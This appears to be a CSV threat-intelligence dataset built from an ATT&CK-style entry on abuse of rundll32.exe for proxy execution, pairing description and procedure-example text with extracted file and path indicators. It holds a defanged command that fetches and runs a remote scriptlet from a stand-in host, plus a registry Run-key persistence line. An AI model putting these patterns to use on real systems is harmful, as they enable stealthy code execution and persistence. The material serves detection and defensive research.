tech_id,tech_name,text,section,ioc,ioc_value
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,Rundll32.exe
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,shell32.dll
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,ExampleDLL.dll
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,file.dll
T1218.011,Rundll32,ADVSTORESHELL  has used rundll32.exe in a Registry value to establish persistence.   [6],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,APT19  configured its payload to inject into the rundll32.exe.   [7],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"APT28  executed  CHOPSTICK  by using rundll32 commands such as  rundll32.exe ""C:\Windows\twain_64.dll"" .  APT28  also executed a .dll for a first stage dropper using rundll32.exe. An  APT28  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.   [8]      [6]      [9]      [10]      [11]      [12]",Procedure Examples,path,C:\Windows\twain_64.dll
T1218.011,Rundll32,"APT28  executed  CHOPSTICK  by using rundll32 commands such as  rundll32.exe ""C:\Windows\twain_64.dll"" .  APT28  also executed a .dll for a first stage dropper using rundll32.exe. An  APT28  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.   [8]      [6]      [9]      [10]      [11]      [12]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"APT28  executed  CHOPSTICK  by using rundll32 commands such as  rundll32.exe ""C:\Windows\twain_64.dll"" .  APT28  also executed a .dll for a first stage dropper using rundll32.exe. An  APT28  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.   [8]      [6]      [9]      [10]      [11]      [12]",Procedure Examples,file,twain_64.dll
T1218.011,Rundll32,APT29  has used  Rundll32.exe  to execute payloads.   [13]      [14]      [15],Procedure Examples,file,Rundll32.exe
T1218.011,Rundll32,APT32  malware has used rundll32.exe to execute an initial infection process.   [17],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"APT38  has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.   [18]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,APT41  has used rundll32.exe to execute a loader.   [19],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Attor 's installer plugin can schedule rundll32.exe to load the dispatcher.   [20],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Bad Rabbit  has used rundll32 to launch a malicious DLL as  C:Windowsinfpub.dat .   [22],Procedure Examples,path,C:Windowsinfpub.dat
T1218.011,Rundll32,"Bisonal  has used rundll32.exe to execute as part of the Registry Run key it adds:  HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez"" .   [23]",Procedure Examples,path,c:\windows\temp\pvcu.dll
T1218.011,Rundll32,"Bisonal  has used rundll32.exe to execute as part of the Registry Run key it adds:  HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez"" .   [23]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"Bisonal  has used rundll32.exe to execute as part of the Registry Run key it adds:  HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez"" .   [23]",Procedure Examples,file,pvcu.dll
T1218.011,Rundll32,Blue Mockingbird  has executed custom-compiled XMRIG miner DLLs using rundll32.exe.   [25],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Cobalt Strike  can use  rundll32.exe  to load DLL from the command line.   [32]      [30],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"The  CozyCar  dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main  CozyCar  component.   [36]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"After copying itself to a DLL file, a variant of  Elise  calls the DLL file using rundll32.exe.   [39]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Variants of  Emissary  have used rundll32.exe in Registry values added to establish persistence.   [40],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Rundll32.exe is used as a way of executing  Flame  at the command-line.   [45],Procedure Examples,file,Rundll32.exe
T1218.011,Rundll32,GreyEnergy  uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\SYSTEM).   [44],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Heyoka Backdoor  can use rundll32.exe to gain execution.   [52],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,InvisiMole  has used rundll32.exe for execution.   [53],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,JHUHUGIT  is executed using rundll32.exe.   [54]      [55],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Kimsuky  has used  rundll32.exe  to execute malicious scripts and malware on a victim's network.   [56],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Kwampirs  uses rundll32.exe in a Registry value added to establish persistence.   [60],Procedure Examples,file,rundll32.exe
